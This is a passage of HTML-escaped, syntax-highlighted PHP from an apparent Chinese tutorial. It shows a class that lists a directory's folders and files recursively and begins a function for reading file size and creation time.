style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$this&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;-&amp;gt;rand&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;=&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$arr&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''rand''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;]?true:false;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;comment&quot; style=&quot;color:#008200;&quot;&gt;//是否随机产生文件名&amp;nbsp;;&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;comment&quot; style=&quot;color:#008200;&quot;&gt;/**&lt;/span&gt;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;comment&quot; style=&quot;color:#008200;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;*&amp;nbsp;获取目录下的所有目录和文件;&lt;/span&gt;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;comment&quot; style=&quot;color:#008200;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;*&amp;nbsp;$dir&amp;nbsp;&amp;nbsp;要遍历的目录;&lt;/span&gt;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;comment&quot; style=&quot;color:#008200;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;*/&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;function&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;getMenu(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$dir&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;)&amp;nbsp;{&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$menu&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;opendir&amp;nbsp;(&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$dir&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;);&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$farr&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;array&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;();&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;while&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;(&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$fileName&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;readdir&amp;nbsp;(&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$menu&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;)&amp;nbsp;)&amp;nbsp;{&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;comment&quot; style=&quot;color:#008200;&quot;&gt;//遍历读取目录，读取完后指针后移一个；&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$file&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$dir&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;.&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;.&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$fileName&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;if&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$fileName&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;!=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''.''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;amp;&amp;amp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$fileName&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;!=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''..''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;)&amp;nbsp;{&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;if&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;is_dir&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;(&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$file&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;))&amp;nbsp;{&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$tmp&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;=&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$this&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;-&amp;gt;getMenu(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$file&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;);&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$farr&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;[&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''menu''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;]&amp;nbsp;[&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$fileName&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;]&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$tmp&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;else&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;{&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$farr&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;[&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$dir&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;]&amp;nbsp;[]&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$fileName&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;comment&quot; style=&quot;color:#008200;&quot;&gt;//不同目录下的文件;&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;closedir&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;(&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$menu&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;);&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;return&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$farr&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;comment&quot; style=&quot;color:#008200;&quot;&gt;/**&lt;/span&gt;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;comment&quot; style=&quot;color:#008200;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;*&amp;nbsp;获取文件,目录的大小，创建时间...&lt;/span&gt;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;comment&quot; style=&quot;color:#008200;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;*&amp;nbsp;@param&amp;nbsp;resource&amp;nbsp;$file&lt;/span&gt;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;comment&quot; style=&quot;color:#008200;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;*/&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;function&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;getInfo(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$file&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;)&amp;nbsp;{&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;if&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;(!&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;file_exists&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;(&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$file&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;))&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;return&lt;/span&gt;&lt;span 